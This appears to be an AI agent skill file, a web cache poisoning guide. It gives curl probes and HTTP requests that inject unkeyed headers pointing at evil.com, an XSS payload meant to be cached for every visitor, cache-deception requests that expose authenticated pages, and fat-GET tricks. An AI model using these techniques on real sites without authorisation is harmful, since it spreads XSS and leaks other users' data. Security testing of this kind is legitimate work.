---
name: cache-poisoning-smuggling
description: "Web cache poisoning and cache deception: unkeyed inputs, cache key confusion, and poisoning stored responses. Use this skill when a CDN or reverse proxy caches responses."
---

# Cache Poisoning

## Overview

A cache stores a response keyed on the URL. If an unkeyed input (header, cookie) influences the response, an attacker can poison the cache for all users.

## Find unkeyed inputs

```bash
# baseline
curl -s https://target/page | md5sum
# with a random header
curl -s https://target/page -H "X-Forwarded-Host: evil.com" | md5sum
```

Different hash → the header is reflected and unkeyed. Tools: `Param Miner` (Burp).

Common unkeyed headers: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`.

## Poison with a redirect

```http
GET /page HTTP/1.1
Host: target
X-Forwarded-Host: evil.com
```

If the app generates `https://evil.com/...` in the body or a 301 `Location`, the cache stores it.

## Poison with XSS

```
X-Forwarded-Host: evil.com"><script>alert(1)</script>
```

If reflected into the cached HTML, every visitor gets the XSS.

## Cache deception

```
GET /account/profile.css HTTP/1.1
Cookie: session=victim
```

The cache stores the authenticated page under a static-looking URL. An attacker requests the same URL and reads the victim's data.

## Parameter cloaking

```
GET /page?utm=1&callback=evil
```

If the cache normalizes one param away but the origin uses it, the two disagree.

## Fat GET

```http
GET /page HTTP/1.1
Content-Length: 12

body=evil
```

Some caches key on the URL but the origin reads the body.

## Detection tools

```bash
# Param Miner
# or manual
for h in X-Forwarded-Host X-Forwarded-Scheme X-Host Forwarded; do
  echo "== $h"; curl -s https://target/ -H "$h: evil.com" | grep -o "evil.com" | head -2
done
```

## Pitfalls

- Poisoning only works if the cache stores the poisoned response (check `X-Cache: HIT`).
- Cache TTL and key normalization differ per CDN.
- Poisoning a shared cache affects other users — coordinate with the owner's rules.

## Verification

A second request on a different client must receive the poisoned content.
